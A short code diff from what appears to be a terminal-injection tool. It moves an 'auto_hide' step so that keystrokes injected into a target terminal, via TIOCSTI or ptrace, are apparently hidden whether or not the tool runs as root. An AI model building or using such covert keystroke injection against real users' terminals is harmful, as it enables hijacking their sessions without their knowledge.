@@ -274,13 +274,13 @@ void* ptrace_target(void *unused)
 /* send input to target */
 void send_input(char c)
 {
+    if (auto_hide) {
+        set_hidden();
+        increment_hide_counter();
+    }
     /* if we have root we can just TIOCSTI,
      * otherwise we need to ptrace and inject the ioctl */
     if (have_root) {
-        if (auto_hide) {
-            set_hidden();
-            increment_hide_counter();
-        }
         ioctl(target_tty_fd, TIOCSTI, &c);
     } else {
         pthread_mutex_lock(&lock);
